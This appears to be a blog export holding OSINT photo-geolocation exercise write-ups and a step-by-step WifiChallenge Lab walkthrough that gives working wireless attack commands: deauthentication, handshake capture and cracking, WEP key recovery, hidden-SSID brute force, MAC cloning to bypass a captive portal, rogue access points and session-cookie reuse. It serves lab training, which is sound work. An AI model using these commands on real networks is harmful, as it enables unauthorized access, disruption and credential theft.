March 2025","externalUrl":null,"permalink":"/posts/osintexercise-4/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 4)","type":"posts"},{"content":" Exercise 3 # In this challenge we are required to find the name and coordinates of the location where the photo was taken from.\nTask briefing: In April 2017 Mohamed Abdullahi Farmaajo, the then president of Somalia, visited Turkey. A news agency published a photo where he was seen shaking hands with Recep Tayyip Erdoğan, the country’s president. The article did not disclose where the photo was taken. Your task is to find out the name and coordinates of the location seen below. To be able to download the image alone you can download it from this link.\nFrom the image seen in the tweet above, we can derive some crucial information that we can use to find the location. First, the date when the post was made is April 2017 and the country where the photo was taken is Turkey. With this information we can search the internet and adjust the date to range from first to the last day of the month of April as shown below.\nFrom the image above after making the search Somalia Turkey, we then click on the tools then select Any time where you will get a drop down and choose custom range where you will be required to put a range of date in American format to which your search will be ranging from as shown below.\nAfter putting the range we get the following searches.\nFrom the image above we can click on the third search as it matches with our tweet post we got for the challenge to see if we can find some interesting information of where the image could be taken, going through the article there is some identifying information, Presidential palace.\nWith that we can go to google maps and search turkey presidential palace and try identify the location of the image.\nFrom the image we have from the challenge it seems the image was taken in front of a door, we can try search it and see the location of the door.\nFrom the image above, the door seems to be located at the entrance of the palace as identified in the images above. Therefore, from our google maps search, the location could be as indicated below.\nWe can copy the coordinates and go to google earth pro and find the location and try to play with the time frame in google earth to try and find a picture that was taken showing a portion of the door.\nAdjusting the time to 2020, we are able to find the door where it is and with that we now have the location and coordinates of where the picture was taken.\nAnswer: Location=Presidential Complex Co-ordinates=39°55'51\u0026quot;N 32°47'58\u0026quot;E\n","date":"3 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-3/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 3)","type":"posts"},{"content":" Exercise 1 # In this challenge we shall be getting the coordinates of where the photo was taken as shown in the description.\nTask briefing: Below you can see a screenshot from a tweet containing a photo. It contains all the relevant information necessary to help you find the exact location. Please identify the coordinates of where the photo was taken. We are given a photo form twitter to get the coordinates of the image\nHowever, to get the image alone we can download it form this link. We shall start by analyzing the image first, furthermore, from the tweet, it seems the image was taken from a town called Kiffa. Doing some search on line, the city is located in Mauritania.\nAt least now we have a small geographical area to conduct our search of the image but lets first analyze the image.\nAs shown above we have analyzed the image, and now we can play around with google earth pro to identify the exact coordinates of the image. To add, the image shows clearly the roads are tarmacked as for many roads in semi-arid regions are usually murram roads and the photo was taken on 2013 february as palces do develop, we shall need to adjust the time frame to 2013 as shown below.\nWith that set we can now try and find from the map areas around kiffa where there are tarmac roads to easily identify our location. After some few minutes of combing through the map, I found the location of where the image was taken as shown below.\nThe coordinates of the area were 16°36'33\u0026quot;N 11°23'52\u0026quot;W. Moreover, the tweet said “present themselves to the newcomers” looking at the area ahead, there is an airport, the newcomers being referred to could be the tourist.\nThis challenge was quite interesting. The tools used are google earth pro (I know it is pro but it is not paid for, it is absolutely free.).\nTo find the time when the image was taken one could use the shademap tool to look at the shadow formation by adjusting the time, to understand on how to solve the challenge using the tool you could read this writeup by notmugrat.\n","date":"1 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-1/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 1)","type":"posts"},{"content":" Exercise 2 # In this challenge we are required to find the name of the train station and the name and height of the tallest building in the image.\nTask briefing: The photo below was shared on social media. It clearly depicts a train station. Please answer the following questions: a) What is the name of the train station seen in the photo? b) What is the name and height of the tallest structure seen in the photo? The image we are given is as shown below.\nHowever, if you want the entire image you can download it from this link.\nname of the train station seen in the photo # To find the name of the train station we could use reverse image search or simply search on google maps the name that is clearly seen in the image.\nWe shall start with reverse image search where I will be using google lens for this instance but there are a variety of tools for doing reverse image search such as\nPimeye googl lens Tineye yandex reveye(This is an extension that can be downloaded on your browser to aid in doing reverse image searches) just to mention a few.\nUsing google lens we found the name of the railway station as shown below.\nTo confirm if that is the real name of the station we could search the name flinders street on google maps or google earth pro and see if we shall get the station.\nSearch as of google earth pro.\nSearch as of google maps.\nAnswer: Flinders Street Railway Station\nname and height of the tallest structure seen in the photo # Now for this section we had to find the street view in order to identify the buildings seen on the image and search for their heights online as it is hard to tell the height of a building from an image.\nFrom google earth pro street view we are able to see four buildings that are available but one building is missing.\nStreet view analysis from google earth pro.\nThe building that is missing from the street view image.\nHowever, from the street view image I did some deep google search of the height of the four buildings I identified but two had heights that caught my interest as shown below.\nThe two buildings Arts Centre Melbourne of height 162 metres and IBM Australia of height 131 metres, however we could not conclude our search there as there is a building that is lacking form our street view, we could therefore play with the time frames from google earth to see the structure when it was available at the time of the picture being taken.\nAfter a few minutes of adjusting the time frame to the year 2012, I got a building structure that was not available at our street view as of 2025 as shown below.\nAs shown below are the structures that were on the image during the capture.\nzooming closer, we are able to find the name of the building as shown below.\nsearching it on google maps as central equity Melbourne as the area is in Melbourne Australia we get this apartment.\nLooking at the street view, it is located behind the two buildings we had identified earlier on the image as shown below and it is indeed the structure that was missing on our earlier street view.\nSearching the height of the building it is 167 metres or 545 ft high as indicated here.\nTherefore comparing the heights of the three buildings\nFOCUS Apartments by Central Equity of height 167 metres Arts Centre Melbourne of height 162 metres IBM Australia of height 131 metres we find that the tallest structure is FOCUS Apartments by Central Equity with a height of 167 metres.\nAnswer FOCUS Apartments by Central Equity of height 167 metres\n","date":"1 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-2/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 2)","type":"posts"},{"content":"","date":"6 January 2025","externalUrl":null,"permalink":"/categories/network-security/","section":"Categories","summary":"","title":"Network Security","type":"categories"},{"content":"","date":"6 January 2025","externalUrl":null,"permalink":"/tags/wifi/","section":"Tags","summary":"","title":"WIFI","type":"tags"},{"content":" Introduction # In this lab, we shall be doing wifi hacking from the WifiChallenge Lab v2.1. We shall start by downloading the virtual machine from the proton drive provided to us from the site, here you can find the virtual machine as per the hypervisor you prefer to use.\n00. What is the contents of the file /root/flag.txt on the VM? # for the first session, after downloading the virtual machine and setting it up, we are given a pair of credentials for the user which is user as well. After logging in to the system we can get our flag in the root directory as per the hint given.\nWith that, we now have our first flag as shown below.\nRECON # 01. What is the channel that the wifi-global Access Point is currently using? # As per the question asked, we need to put our network card in network mode in order to use it for reconnaissance. For this section we shall use airmon-ng to put our network card in monitor mode and airodump-ng for capturing network traffic and scanning all the channels for it to be easier to identify the wfi-global .\nWe shall use the wlan0 for monitoring.\nLet us put the card into monitor mode using the syntax as shown in the documentation page but first we shall check running processes using the syntax sudo airmon-ng check as shown below.\nwe can kill them and put our interface into monitor mode using the command sudo airmon-ng check kill\nwith that, we can now enable our interface into monitor mode using the command `sudo airmon-ng start wlan0\nAfter we have enabled our interface for monitoring we can then start capturing the network traffic as we scan through for our asked wifi’s channel using airodump-ng, as shown below.\nsudo airodump-ng wlan0mon -w ~/VICTOR/captures --manufacturer --wps --band abg\nwhere -w tells where we shall output our traffic, --manufacturer is used to Display manufacturer from IEEE OUI list, --wps is used to display wps information and —band abg is used to display Band on which airodump-ng should hop as shown in the documentation.\nwe can now see our channel clearly.\n02. What is the MAC of the wifi-IT client? # Here we shall use airodump-ng and specify the channel of the wifi in order to get more detials of the wifi using the command sudo airodump-ng wlan0mon -w ~/VICTOR/captures --manufacturer --wps --band abg --channel \u0026lt;channel number\u0026gt;\n03. What is the probe of 78:C1:A7:BF:72:46 # To get the probe for the specified we shall use airodum-ng to scan the network again using the command we used first that is sudo airodump-ng wlan0mon -w ~/VICTOR/captures --manufacturer --wps --band abg and get the probe as shown below.\n04. What is the ESSID of the hidden AP (mac F0:9F:C2:6A:88:26)? # For this section, we shall use the mdk4 tool to perform a brute force to launch probes with each of the ESSID until the AP responds, however we shall need to modify our wordlist by embedding the word wifi- before the words as the other APs are named.\ncat ~/rockyou-top100000.txt | awk '{print \u0026quot;wifi-\u0026quot; $1}' \u0026gt; /home/user/VICTOR/captures/pass.txt\nFirst we shall capture the traffic using the command we used before in order for us to identify the channel to which the AP is on to use it to set for us to capture the traffic to perform a brute force attack on it to get the AP name using the commands shown below.\niwconfig wlan0mon channel \u0026lt;channel number\u0026gt; the iwconfig is used to display and change the parameters of the network interface which are specific to the wireless operation, in this case we are setting the channel to that of the hidden AP.\nAfterwards we shall then brute force the captured traffic using mdk4 as shown mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f pass.txt.\nmdk4 :\nThe name of the tool being run. MDK4 is commonly used for Wi-Fi testing and comes with several testing modes.\nwlan0mon :\nThe network interface in monitor mode (important for injecting packets and performing wireless attacks). Replace wlan0mon with your interface name if it\u0026rsquo;s different.\np :\nThis specifies the Probe Request Flood mode in MDK4. This mode sends a flood of probe requests, which can simulate many devices searching for networks, potentially overloading the target AP or causing disruptions.\nt F0:9F:C2:6A:88:26 :\nThe t option specifies the target\u0026rsquo;s MAC address . In this case, the target MAC address is F0:9F:C2:6A:88:26.\nf pass.txt :\nThe f option provides a file containing SSIDs (network names) or other parameters to use during the attack.\nIn this case, the file pass.txt likely contains SSIDs that will be included in the probe requests to target the specific access point.\nOPN # 05. What is the flag in the hidden AP router behind default credentials? # After we got our ESSID, we shall now try to connect to the network using wpa_supplicant,(utility for managing wireless network connections in Linux) from the terminal after creating a config file that will enable us to connect to the wifi, the contents of the file will be as shown below.\nnetwork={ ssid=\u0026#34;$ESSID\u0026#34; key_mgmt=NONE scan_ssid=1 } The above details mean the following.\nnetwork={} :\nThis block defines a specific Wi-Fi network configuration. ssid=\u0026quot;$ESSID\u0026quot; :\nssid specifies the name of the Wi-Fi network to connect to. If you use $ESSID, it implies that $ESSID is a variable (e.g., set in your environment or script). Note : wpa_supplicant does not directly interpret variables in the configuration file. You would need to preprocess the file or replace $ESSID with the actual network name (e.g., ssid=\u0026quot;MyNetwork\u0026quot;). key_mgmt=NONE :\nkey_mgmt=NONE specifies that no key management is required for this network. This typically indicates an open network (e.g., one without WPA/WPA2 encryption). scan_ssid=1 :\nscan_ssid=1 tells wpa_supplicant to actively scan for the specified SSID. This is useful for hidden networks (networks that don\u0026rsquo;t broadcast their SSID). after we have created our file, we shall now try to connect to our wifi using wpa_supplicant using the syntax wpa_supplicant -Dnl80211 -iwlan2 -c free.conf and on another terminal we shall try to get an IP address from the connected wifi network using the dhclient using the command dhclient wlan2 -v as root user .\nThe command wpa_supplicant -Dnl80211 -iwlan2 -c free.conf means as follows\nwpa_supplicant : This is the command-line tool for connecting to Wi-Fi networks. It\u0026rsquo;s used to handle the WPA/WPA2 authentication process. Dnl80211 : The D option specifies the driver back-end to be used. nl80211 is the modern driver interface for communicating with kernel-based Wi-Fi drivers, typically used in most Linux distributions. Other options might include wext (deprecated) or hardware-specific back-ends. iwlan2 : The i option specifies the interface name of the Wi-Fi network card you want to connect with. In this case, the interface is wlan2. Replace this with your actual wireless interface (e.g., wlan0 or wlan1) if necessary. c free.conf : The c option specifies the configuration file to use. free.conf is the configuration file that contains the necessary details for connecting to the desired wireless network. This file typically includes: The SSID (network name). The security protocols (e.g., WPA2, PSK). The pre-shared key or passphrase for the network. The command dhclient wlan2 -v means\ndhclient : This is the DHCP client program on Linux systems. It requests network configuration parameters (like an IP address, subnet mask, gateway, DNS servers) from a DHCP server on the network. wlan2 : The name of the network interface for which the DHCP request is being made. In this case, it is the wlan2 interface (likely a wireless network adapter). v : Enables verbose mode , which provides detailed output about the process, such as: Sending the DHCP request. Responses received from the DHCP server. Lease details (e.g., assigned IP, lease time, etc.). Any errors encountered during the process. The image above shows the wpa_supplicant running.\nHere we have received an IP address from the network as 192.168.16.84\nOnce connected to the wifi network we can access the web portal from 192.168.16.1 and try to login as an admin user using some default credentials as admin/admin as most people tend to leave their default creds as they are.\nAfter logging in using the creds we found, we now have our flag.\n06. What is the flag on the AP router of the wifi-guest network? # For this challenge we shall begin by scanning the wifi-guest using airodump-ng as we did in the first challenge of recon in order to identify the channel on to which it is running on then try to access the admin page as we did in the previous task.\nIt is running on channel 6, we can now try and capture traffic going through channel 6 alone then create a .conf file that will allow us to connect to the wifi network, the config file will contain the name of the ESSID of the wifi and set key_mgmt=NONE as shown below.\nnetwork={ ssid=\u0026#34;wifi-guest\u0026#34; key_mgmt=NONE } As seen below we have successfully acquired an IP address from the wifi network and we are able to access the web page but it seems we have a captive portal that we are required to bypass.\nFor us to bypass this portal, we will have to clone one of the MAC addresses connected to the wifi as shown below we have one.\nB0:72:BF:44:B0:49\nwe shall first stop the network manager then set the wlan2 interface down then change to the mac address we saw earlier using the commands below and retry again to connect to the wifi network as earlier.\nsystemctl stop network-manager ip link set wlan2 down macchanger -m b0:72:bf:44:b0:49 wlan2 ip link set wlan2 up we have now bypassed the portal as shown below.\nI tried some default creds but they did not work, however, I decided to capture traffic using airodump-ng on the channel and go through it to see f there are any credentials that I can find on the capture file.\nas shown above after capturing our traffic using the command airodump-ng wlan0mon --manufacturer --wps -c6 -w /home/user/VICTOR/captures/OPN/ we can now go through our traffic and be able to get the password by going through the traffic using wireshark then get our credentials for logging in to the web page as admin.\nand we have our flag.\nWEP # 07. What is the flag on the wifi-old AP website? # This challenge was quite easy as we can get the cahnnel and BSSID of the wifi using airodump-ng and try get the key using besside-ng as shown below.\nThen we can use besside-ng to get the key, as this tool does the heavy work automatically and gets the password for us, we shall use the syntax besside-ng -c 3 -b F0:9F:C2:71:22:11 wlan2 -v .\nbesside-ng : The main tool being run. It automates the process of: Scanning for networks. Associating with access points. Capturing WPA/WPA2 handshakes. Cracking WEP-encrypted networks. c 3 : The c option specifies the Wi-Fi channel to focus on. In this case, it restricts the tool to operate on channel 3 , rather than scanning all available channels. b F0:9F:C2:71:22:11 : The b option specifies the MAC address of the target access point (AP) . This ensures that besside-ng only targets the specific AP with MAC address F0:9F:C2:71:22:11. wlan2 : The wireless interface to be used for the attack. This interface must support monitor mode and packet injection. Ensure wlan2 is already in monitor mode (e.g., using airmon-ng start wlan2). v : Enables verbose mode , which provides detailed output during execution. Useful for monitoring the tool’s progress and troubleshooting any issues. We now have the key as shown below for the wifi network.\nNow as WEP has a weaker security for wifi, we can use the key to create a .conf file as the intial challenge and connect to the network using wpa_supplicant and get our IP address using dhclient on another terminal as we run it as root user, the contents of the .conf file shall be.\nnetwork={ ssid=\u0026#34;wifi-old\u0026#34; key_mgmt=NONE wep_key0=$PASSWORD wep_tx_keyidx=0 } The contents of the file mean as explained below.\nnetwork={} : Defines a specific Wi-Fi network to connect to. Each network block contains settings for a single network. ssid=\u0026quot;wifi-old\u0026quot; : Specifies the SSID (network name) of the Wi-Fi network you want to connect to. In this case, the network name is wifi-old . key_mgmt=NONE : Specifies the key management protocol . NONE indicates there is no WPA or WPA2 encryption . This is common for WEP networks or open networks. Instead of WPA or WPA2, the network uses the outdated WEP encryption . wep_key0=$PASSWORD : Defines the WEP key (password) for the network. The key is expected to be supplied in this placeholder $PASSWORD. However: wpa_supplicant does not resolve variables directly in the configuration file, so you need to replace $PASSWORD with the actual WEP key (e.g., wep_key0=12345). The key can be specified as: A hexadecimal string (e.g., wep_key0=6162636465). A quoted ASCII string (e.g., wep_key0=\u0026quot;abcde\u0026quot;). wep_tx_keyidx=0 : Specifies which WEP key index to use for transmission. WEP supports multiple keys (up to 4, indexed from 0 to 3). wep_tx_keyidx=0 means the first key (wep_key0) will be used for encrypting outgoing packets. as seen above we have successfully connected to the wifi network and now we can try and access the webpage at 192.168.1.1\nwe have our flag now.\nPSK # 08. What is the wifi-mobile AP password? # This challenge we have to find the password for the PSK wifi network, here we shall monitor the traffic using airodump-ng and wait for a client to connect or to force a deauth attack with aireplay-ng but first we have to identify the channel of the wifi network.\nIt is channel 6, we can now capture traffic on the channel as we perform a deauth attack on another terminal using aireplay-ng to get a handshake that we can use to get the password for the wifi.\nThe commands we shall use in parallel are as follows.\naireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon\naireplay-ng :\nThis is the tool being executed. It is used to inject packets into a wireless network for various purposes (e.g., deauthentication, fake authentication, ARP request replay). 0 :\nSpecifies a deauthentication attack mode . The tool sends deauthentication packets to disconnect clients from the target network. 10 :\nIndicates the number of deauthentication packets to send. In this case, 10 deauthentication packets will be sent. You can specify 0 to send packets continuously until manually stopped. a F0:9F:C2:71:22:12 :\nSpecifies the MAC address of the target access point (AP) . In this case, the deauthentication packets will be directed at the AP with MAC address F0:9F:C2:71:22:10 . wlan0mon :\nSpecifies the wireless interface in monitor mode . The interface (wlan0mon) must be in monitor mode, which is required to send raw packets. Use airmon-ng start wlan0 to enable monitor mode before running this command airodump-ng wlan0mon -w ~/wifi/scanc6 -c 6 --wps\nas seen above we have performed a deauth attack(an EAPOL traffic indicates that we have captured a successful handshake from the wifi network) using aireplay-ng and we wait a little longer for the airodump-ng to capture some traffic that we can use aircrack-ng to try and get the password using the wordlist top100000.txt.\naircrack-ng -w rockyou-top100000.txt -- '-01.cap'\nwe have our key.\n09. What is the IP of the web server in the wifi-mobile network? # For this challenge we shall use airdecap-ng to decipher our traffic we captured earleir as we now have the key to decipher our traffic then open the deciphered file using wireshark to get the IP of the webserver.\nThe command we shall use to decipher our traffic is as follows.\nairdecap-ng -e wifi-mobile -p $PASSWORD -- '-01.cap'\nairdecap-ng : The tool decrypts WEP, WPA, or WPA2-encrypted packet captures (.cap files) based on the network\u0026rsquo;s encryption key or passphrase. e wifi-mobile : Specifies the ESSID (network name) of the target Wi-Fi network. In this case, the ESSID is wifi-mobile. It helps the tool identify which network\u0026rsquo;s packets to decrypt, especially when multiple networks are present in the capture file. p $PASSWORD : p specifies the password (or passphrase) of the target Wi-Fi network. $PASSWORD is a placeholder variable that stores the actual Wi-Fi passphrase. If the variable contains the correct passphrase, airdecap-ng will use it to decrypt the encrypted packets in the capture file. - : The - signals the end of options. Anything after - is treated as an argument (like file names), even if it starts with a ``. '-01.cap' : The name of the capture file that contains the encrypted packets to decrypt. The file name 01.cap starts with a dash (``), which can confuse tools into interpreting it as a flag. Using - or prefixing the file name with ./ ensures it\u0026rsquo;s treated as a file. we can now open the deciphered traffic and get the IP of the webserver.\nwe have our webserver IP as shown below\n10. what is the flag after login in wifi-mobile? # As seen from the hint given, we are required to use cookies.\nGoing through the decrypted traffic, we saw a cookie from the GET request sent to the web server that we can use to gain the user flag from the website.\nWe shall use wpa_supplicant and dhclient as we did earlier in order to be able to log in to the website.\nThe contents of our configure file shall be as follows.\nnetwork={ ssid=\u0026#34;wifi-mobile\u0026#34; psk=\u0026#34;$PASSWORD\u0026#34; scan_ssid=1 key_mgmt=WPA-PSK proto=WPA2 }PHPSESSID=97qfe2c37hso8725c1p5reft7s network={ ... } : Defines a network block, which contains all the settings required to connect to a specific Wi-Fi network. ssid=\u0026quot;wifi-mobile\u0026quot; : Specifies the SSID (Service Set Identifier) of the Wi-Fi network. In this case, the SSID is wifi-mobile. psk=\u0026quot;$PASSWORD\u0026quot; : Specifies the pre-shared key (PSK) , which is the password for the Wi-Fi network. $PASSWORD is a placeholder variable. Replace it with the actual passphrase (e.g., psk=\u0026quot;mypassword123\u0026quot;). The PSK is used for WPA/WPA2-Personal authentication. scan_ssid=1 : Tells the device to actively scan for the network , even if the SSID is hidden. If the access point does not broadcast its SSID, setting this to 1 enables the client to detect and connect to it. key_mgmt=WPA-PSK : Specifies the key management protocol used by the network. WPA-PSK indicates WPA/WPA2 with a Pre-Shared Key (PSK) for authentication. proto=WPA2 : Specifies the protocol to be used for encryption and authentication. WPA2 is used here, which is a secure protocol based on AES encryption. You could also specify WPA for legacy networks. As shown below, we have successfully been given an IP to the network we can try to access the webpage and edit the cookie to get the flag.\nwe have our flag as shown below.\n11. Is there client isolation in the wifi-mobile network? # For this challenge we shall use arp-scan to scan the network for more hosts though the interface we have connected to the network using the commmand sudo arp-scan -I wlan2 -l\narp-scan :\narp-scan is a tool used to identify all active devices on a local network by sending ARP (Address Resolution Protocol) requests. It works at the data link layer (Layer 2), making it highly effective for discovering devices on the same subnet. I wlan2 :\nI specifies the network interface to use for the scan. In this case, wlan2 is the wireless interface you want to scan with. l :\nl (lowercase \u0026ldquo;L\u0026rdquo;) tells arp-scan to scan the local subnet (determined by the interface\u0026rsquo;s IP address and subnet mask). For example, if the interface wlan2 is on 192.168.1.0/24, it will scan all IPs in that range (from 192.168.1.1 to 192.168.1.254). After scanning the network we fingd the following clients on the network.\nuser@WiFiChallengeLab:~/VICTOR/captures/psk$ sudo arp-scan -I wlan2 -l Interface: wlan2, type: EN10MB, MAC: 02:00:00:00:02:00, IPv4: 192.168.2.84 Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.2.1\tf0:9f:c2:71:22:12\tUbiquiti Networks Inc. 192.168.2.7\t28:6c:07:6f:f9:43\tXIAOMI Electronics,CO.,LTD 192.168.2.7\t28:6c:07:6f:f9:44\tXIAOMI Electronics,CO.,LTD (DUP: 2) 192.168.2.8\t28:6c:07:6f:f9:43\tXIAOMI Electronics,CO.,LTD 192.168.2.8\t28:6c:07:6f:f9:44\tXIAOMI Electronics,CO.,LTD (DUP: 2) 5 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.9.7: 256 hosts scanned in 2.225 seconds (115.06 hosts/sec). 5 responded we can try and curl one of the host and see if we can get the flag.\nby curling the host 192.168.2.8 we get the user flag.\n12. What is the wifi-offices password? # For this challenge, imagine you’re trying to connect to a Wi-Fi network called \u0026ldquo;wifi-offices,\u0026rdquo; but it doesn’t show up in the list of available networks. This could mean the network is in a different location or no longer exists. However, there’s still a way to figure out its password. Here’s how:\nWe can create a fake access point (AP) that imitates \u0026ldquo;wifi-offices\u0026rdquo; using a tool like hostapd-mana. When devices nearby try to connect to this fake AP (because they’re still looking for \u0026ldquo;wifi-offices\u0026rdquo;), we can capture their connection attempts, also known as probes. From these, we can capture a handshake, which is like a key exchange between the device and the network. Once we have this handshake, we can run a dictionary attack on it to try and crack the password and see it in plain text.\nThe contents of our config file shall contain the following details.\ninterface=wlan1 driver=nl80211 hw_mode=g channel=1 ssid=wifi-offices mana_wpaout=hostapd.hccapx wpa=2 wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP CCMP wpa_passphrase=12345678 The above file contents means the following\ninterface=wlan1 Specifies the wireless interface to be used for hosting the access point. In this case, the interface is wlan1 . This must be a wireless adapter that supports monitor and AP modes. driver=nl80211 Indicates the driver to be used by hostapd. nl80211 is the standard driver interface used for modern Wi-Fi adapters with Linux. hw_mode=g Defines the Wi-Fi mode for the access point: g : Operates on the 2.4 GHz band, supporting 802.11g (and backward-compatible 802.11b) devices. Other options could include a (5 GHz) or n (802.11n for mixed bands). channel=1 Specifies the Wi-Fi channel to use for the access point. Channel 1 operates on the 2.4 GHz frequency band. The channel you choose can affect performance and interference. ssid=wifi-offices Sets the SSID (Service Set Identifier) for the fake access point. The AP will broadcast itself with the name wifi-offices , imitating a real network. mana_wpaout=hostapd.hccapx Configures the output file for captured WPA/WPA2 handshakes . The captured handshake data will be saved to the file hostapd.hccapx , which can later be used for password cracking (e.g., with tools like Hashcat). wpa=2 Specifies the WPA protocol version to be used: 2 : Configures WPA2 (more secure and commonly used). 1 : Would configure WPA (less secure and outdated). wpa_key_mgmt=WPA-PSK Defines the key management protocol : WPA-PSK : Stands for WPA Pre-Shared Key , the standard for personal Wi-Fi networks where a single password is shared among users. wpa_pairwise=TKIP CCMP Specifies the encryption protocols to be used for securing data: TKIP : Temporal Key Integrity Protocol (older and less secure, for backward compatibility). CCMP : Counter Mode Cipher Block Chaining Message Authentication Code Protocol (stronger encryption based on AES). wpa_passphrase=12345678 Sets the Wi-Fi password (passphrase) for the rogue access point. The password for this network is 12345678 . After writing the file and running it with hostapd-mana we get some hashes that we can crack using hashcat as shown below.\ntrying to crack the hash using mode 2500 it does not work, we can try to change it to mode 2200 and try again\nAfter some research, I found out the hash was supposed to be separated from other unwanted characters using the following syntax.\ncat hostapd.hccapx | awk {\u0026#39;print $3\u0026#39;} \u0026gt; hostapd.22000 Breakdown:\ncat hostapd.hccapx Reads (concatenates) the contents of the file hostapd.hccapx and outputs it. | (Pipe) Passes the output of cat as input to the next command. awk {'print $3'} Uses awk, a text processing tool, to extract the third column ($3) from each line. \u0026gt; hostapd.22000 Redirects the output to a new file named hostapd.22000. We now have our password for the wifi as shown below.\nthe password was easily found by using the syntax below with hashcat hashcat -a 0 -m 22000 hostapd.22000 ~/rockyou-top100000.txt --force\nSAE # 13. What is the flag on the wifi-management AP website? # Even in WPA3 networks, it’s still possible to attempt a brute-force attack to discover the password. A tool called \u0026ldquo;wacker\u0026rdquo; can be used for this purpose. It allows us to repeatedly test different password combinations against the network until the correct one is found.\nHowever, keep in mind that WPA3 includes features like SAE (Simultaneous Authentication of Equals), which makes brute-forcing much more challenging by limiting the speed of attempts and using modern cryptographic techniques. Tools like wacker exploit specific vulnerabilities or rely on scenarios where the WPA3 implementation might not be as secure as intended.\nFirst we will have to get the wifi network bssid number and frequency that we can use together with wacker to get the wifi password then use wpa_supplicant to be able to access the website to get the flag.\nwe now have the BSSID number F0:9F:C2:11:0A:24 we can now use the BSSID to get the password using wacker with the syntax ./wacker.py --wordlist ~/rockyou-top100000.txt --ssid wifi-management --bssid F0:9F:C2:11:0A:24 --interface wlan2 --freq 2462\nhere is the breakdown of the command\n./wacker.py This runs the Python script wacker.py, which is likely a custom or specialized tool for Wi-Fi brute-forcing or attack tasks. -wordlist ~/rockyou-top100000.txt Specifies the path to the wordlist containing potential passwords to test. In this case, it uses rockyou-top100000.txt, a popular subset of the rockyou.txt password dictionary file, which contains 100,000 commonly used passwords. -ssid wifi-management Indicates the target SSID (Wi-Fi network name) you are attacking. Here, the network is called wifi-management. -bssid F0:9F:C2:11:0A:24 Specifies the target’s BSSID, which is the unique MAC address of the access point. This ensures the attack focuses on the correct network, even if there are other networks with similar SSIDs nearby. -interface wlan2 Defines the wireless interface (network adapter) that will be used for the attack. In this example, the wireless adapter is wlan2. -freq 2462 Specifies the frequency of the Wi-Fi channel in MHz. 2462 MHz corresponds to channel 11 in the 2.4 GHz band. The tool will tune into this frequency to communicate with the target network. we have our password, we can use it now to create a config file that we can use with wpa_supplicant, the following is the content of the file\nnetwork={ ssid=\u0026#34;wifi-management\u0026#34; psk=\u0026#34;$PASSWORD\u0026#34; key_mgmt=SAE scan_ssid=1 ieee80211w=2 } the file content means as follows\nnetwork={...} This block defines the configuration for a specific Wi-Fi network. Multiple network blocks can exist in a configuration file to manage multiple networks. ssid=\u0026quot;wifi-management\u0026quot; Specifies the SSID (Service Set Identifier) of the Wi-Fi network to connect to. Here, the network name is wifi-management. psk=\u0026quot;$PASSWORD\u0026quot; Indicates the pre-shared key (Wi-Fi password) required to connect to the network. The $PASSWORD placeholder would typically be replaced with the actual password in plaintext or a hashed version (depending on your tool). key_mgmt=SAE Specifies the key management protocol to use for authentication. SAE (Simultaneous Authentication of Equals) is the protocol used in WPA3-Personal networks. It enhances security by preventing offline dictionary attacks and improving password-based authentication. scan_ssid=1 Enables scanning for hidden networks . A hidden SSID will not broadcast its name, so enabling scan_ssid=1 allows the client to actively probe for the specified SSID. ieee80211w=2 Configures Management Frame Protection (MFP) . Values : 0: Disabled (not recommended). 1: Optional. 2: Required (mandatory for WPA3). ieee80211w=2 ensures that MFP is enforced, providing additional protection against deauthentication attacks, which is required for WPA3 networks. We can now access the AP website at 192.168.14.1 as seen below and get our flag.\n14. What is the flag on the wifi-IT AP website? # When dealing with a network using WPA3-SAE, it’s possible to exploit a weakness if a client is configured to support both WPA2 and WPA3. Here’s how it works: we can trick the client into downgrading its connection to WPA2 by setting up a Rogue Access Point (RogueAP). Once the client connects to our RogueAP, we can capture the WPA2 handshake and later try to crack it.\nTake the example of the wifi-offices network. In this scenario, the access point (AP) supports both SAE (used in WPA3) and PSK (used in WPA2). This suggests that some clients might still accept PSK connections. To confirm this, we can analyze the data captured by tools like airodump-ng , specifically looking at the .csv file it generates. This file provides details about the authentication methods supported by the AP and its clients, helping us determine whether the downgrade attack is feasible.\nWe shall start by identifying the BSSID of the wifi using airodump-ng that we can use later .\nwe have the BSSID as F0:9F:C2:1A:CA:25 ,we can now create a rogue AP but first we shall create our config file with the following contents\ninterface=wlan1 driver=nl80211 hw_mode=g channel=11 ssid=wifi-IT mana_wpaout=hostapd-management.hccapx wpa=2 wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP CCMP wpa_passphrase=12345678 interface=wlan1\nSpecifies the wireless network interface to be used for the access point. Here, it’s wlan1 .\ndriver=nl80211\nSets the driver for the wireless card. nl80211 is the standard Linux driver used for most modern Wi-Fi devices.\nhw_mode=g\nSpecifies the wireless mode. g indicates that the AP will operate on the 2.4 GHz band , supporting 802.11g devices.\nchannel=11\nSpecifies the Wi-Fi channel on which the AP will operate. Channel 11 is a common choice for 2.4 GHz networks.\nssid=wifi-IT\nSets the SSID (Service Set Identifier) of the access point. This is the name of the network that devices will see when scanning for Wi-Fi. Here, the network is named wifi-IT .\nmana_wpaout=hostapd-management.hccapx\nConfigures mana-toolkit to save captured WPA handshake data to a file named hostapd-management.hccapx . This can be used for offline password cracking.\nwpa=2\nSpecifies the security protocol used for the network. 2 indicates WPA2, which is a secure Wi-Fi encryption standard.\nwpa_key_mgmt=WPA-PSK\nSets the key management method. WPA-PSK (Pre-Shared Key) means devices will use a shared password for authentication.\nwpa_pairwise=TKIP CCMP\nConfigures the encryption protocols:\nTKIP (Temporal Key Integrity Protocol): An older encryption method. CCMP (Counter Mode with Cipher Block Chaining Message Authentication Code Protocol): A more secure encryption method based on AES. Modern devices usually prefer CCMP . wpa_passphrase=12345678\nSets the pre-shared key (Wi-Fi password) for the network. In this example, the password is 12345678 . It must be between 8 and 63 characters long.\nBefore we set up our rogue AP lets check if the AP has MFP with wireshark as shown below.\nyou may be wondering why we had to check MFP, let me break it down to you. 